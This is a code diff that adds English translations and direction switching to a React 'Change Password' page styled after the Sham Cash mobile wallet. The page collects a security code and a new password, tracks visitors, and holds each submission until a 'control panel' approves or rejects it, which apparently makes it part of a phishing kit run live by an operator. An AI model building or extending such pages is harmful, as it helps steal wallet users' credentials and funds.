@@ -2,6 +2,44 @@ import { useState, useRef, useEffect } from "react";
 import { Lock, ShieldCheck, Eye, EyeOff, CheckCircle, XCircle } from "lucide-react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
+import { useLang } from "@/hooks/useLang";
+
+const T = {
+  ar: {
+    back: "رجوع", dir: "rtl" as const,
+    heading: "تغيير كلمة المرور",
+    subtitle: "ادخل كلمة السر الجديدة و رمز الأمان الخاص بك",
+    securityCode: "رمز الأمان",
+    newPass: "كلمة المرور الجديدة",
+    confirmPass: "تأكيد كلمة المرور",
+    waiting: "في انتظار الموافقة من لوحة التحكم...",
+    waitingBtn: "جارٍ الانتظار...",
+    submit: "تغيير كلمة المرور",
+    approvedTitle: "تم تغيير كلمة المرور",
+    approvedSub: "تم تحديث كلمة المرور بنجاح.\nيمكنك الآن تسجيل الدخول.",
+    login: "تسجيل الدخول",
+    rejectedTitle: "تم رفض الطلب",
+    rejectedSub: "لم يتم تغيير كلمة المرور.\nيرجى المحاولة مجدداً.",
+    tryAgain: "المحاولة مجدداً",
+  },
+  en: {
+    back: "Back", dir: "ltr" as const,
+    heading: "Change Password",
+    subtitle: "Enter your new password and security code",
+    securityCode: "Security Code",
+    newPass: "New Password",
+    confirmPass: "Confirm Password",
+    waiting: "Waiting for approval from the control panel...",
+    waitingBtn: "Waiting...",
+    submit: "Change Password",
+    approvedTitle: "Password Changed",
+    approvedSub: "Your password has been updated successfully.\nYou can now sign in.",
+    login: "Sign In",
+    rejectedTitle: "Request Rejected",
+    rejectedSub: "Password was not changed.\nPlease try again.",
+    tryAgain: "Try Again",
+  },
+};
 
 function ShamLogo() {
   return (
@@ -29,6 +67,8 @@ export function ShamCashChangePassword() {
   const [showConfirm, setShowConfirm] = useState(false);
   const [status, setStatus] = useState<Status>("idle");
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [lang] = useLang();
+  const t = T[lang];
   useVisitorTracking("تغيير كلمة المرور");
   useAdminCommands();
 
@@ -55,21 +95,19 @@ export function ShamCashChangePassword() {
 
   if (status === "approved") {
     return (
-      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
+      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
         <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
         <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
         <div className="mx-auto flex min-h-screen max-w-[390px] flex-col items-center justify-center px-6 text-center space-y-5">
           <CheckCircle className="h-20 w-20 text-[#1fc28a]" strokeWidth={1.5} />
-          <h2 className="text-[24px] font-extrabold text-white/90">تم تغيير كلمة المرور</h2>
-          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed">
-            تم تحديث كلمة المرور بنجاح.<br />يمكنك الآن تسجيل الدخول.
-          </p>
+          <h2 className="text-[24px] font-extrabold text-white/90">{t.approvedTitle}</h2>
+          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed whitespace-pre-line">{t.approvedSub}</p>
           <button
             type="button"
             onClick={() => { window.location.href = "/"; }}
             className="mt-4 h-[58px] w-full rounded-[15px] bg-[#657bd8] text-[18px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] hover:bg-[#7089e0] transition-colors active:scale-[0.98]"
           >
-            تسجيل الدخول
+            {t.login}
           </button>
         </div>
       </div>
@@ -78,14 +116,12 @@ export function ShamCashChangePassword() {
 
   if (status === "rejected") {
     return (
-      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
+      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
         <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
         <div className="mx-auto flex min-h-screen max-w-[390px] flex-col items-center justify-center px-6 text-center space-y-5">
           <XCircle className="h-20 w-20 text-[#e54343]" strokeWidth={1.5} />
-          <h2 className="text-[24px] font-extrabold text-[#e54343]">تم رفض الطلب</h2>
-          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed">
-            لم يتم تغيير كلمة المرور.<br />يرجى المحاولة مجدداً.
-          </p>
+          <h2 className="text-[24px] font-extrabold text-[#e54343]">{t.rejectedTitle}</h2>
+          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed whitespace-pre-line">{t.rejectedSub}</p>
           <button
             type="button"
             onClick={() => {
@@ -94,7 +130,7 @@ export function ShamCashChangePassword() {
             }}
             className="mt-4 h-[58px] w-full rounded-[15px] bg-[#2a3047] text-[18px] font-bold text-white/80 hover:bg-[#333d5c] transition-colors"
           >
-            المحاولة مجدداً
+            {t.tryAgain}
           </button>
         </div>
       </div>
@@ -102,7 +138,7 @@ export function ShamCashChangePassword() {
   }
 
   return (
-    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
+    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
       <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col px-4 pb-7 pt-4 font-['Inter']">
         <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
         <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
@@ -114,9 +150,9 @@ export function ShamCashChangePassword() {
             className="flex items-center gap-1.5 text-[14px] font-bold text-white/50 hover:text-white/80 transition-colors"
           >
             <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
-              <path d="M15 19l-7-7 7-7" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+              <path d={lang === "ar" ? "M15 19l-7-7 7-7" : "M9 19l7-7-7-7"} stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
             </svg>
-            رجوع
+            {t.back}
           </button>
         </div>
 
@@ -126,11 +162,11 @@ export function ShamCashChangePassword() {
 
         <div className="relative space-y-5">
           <div className="space-y-1">
-            <h1 className="text-right text-[27px] font-extrabold tracking-[-0.02em] text-white/90">
-              تغيير كلمة المرور
+            <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
+              {t.heading}
             </h1>
-            <p className="text-right text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed">
-              ادخل كلمة السر الجديدة و رمز الأمان الخاص بك
+            <p className={`text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed ${lang === "ar" ? "text-right" : "text-left"}`}>
+              {t.subtitle}
             </p>
           </div>
 
@@ -139,10 +175,10 @@ export function ShamCashChangePassword() {
               <div className="text-white/60"><ShieldCheck className="h-5 w-5" /></div>
               <input
                 type="text"
-                placeholder="رمز الأمان"
+                placeholder={t.securityCode}
                 disabled={status === "pending"}
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50"
-                dir="rtl"
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir}
               />
             </div>
 
@@ -150,10 +186,10 @@ export function ShamCashChangePassword() {
               <div className="text-white/60"><Lock className="h-5 w-5" /></div>
               <input
                 type={showNew ? "text" : "password"}
-                placeholder="كلمة المرور الجديدة"
+                placeholder={t.newPass}
                 disabled={status === "pending"}
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50"
-                dir="rtl"
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir}
               />
               <button type="button" onClick={() => setShowNew(!showNew)} className="text-white/60 hover:text-white/90 transition-colors">
                 {showNew ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
@@ -164,10 +200,10 @@ export function ShamCashChangePassword() {
               <div className="text-white/60"><Lock className="h-5 w-5" /></div>
               <input
                 type={showConfirm ? "text" : "password"}
-                placeholder="تأكيد كلمة المرور"
+                placeholder={t.confirmPass}
                 disabled={status === "pending"}
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50"
-                dir="rtl"
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir}
               />
               <button type="button" onClick={() => setShowConfirm(!showConfirm)} className="text-white/60 hover:text-white/90 transition-colors">
                 {showConfirm ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
@@ -181,7 +217,7 @@ export function ShamCashChangePassword() {
                 <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25" />
                 <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
               </svg>
-              في انتظار الموافقة من لوحة التحكم...
+              {t.waiting}
             </p>
           )}
 
@@ -202,10 +238,10 @@ export function ShamCashChangePassword() {
                     <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeOpacity="0.3" />
                     <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                   </svg>
-                  جارٍ الانتظار...
+                  {t.waitingBtn}
                 </>
               ) : (
-                "تغيير كلمة المرور"
+                t.submit
               )}
             </button>
           </div>
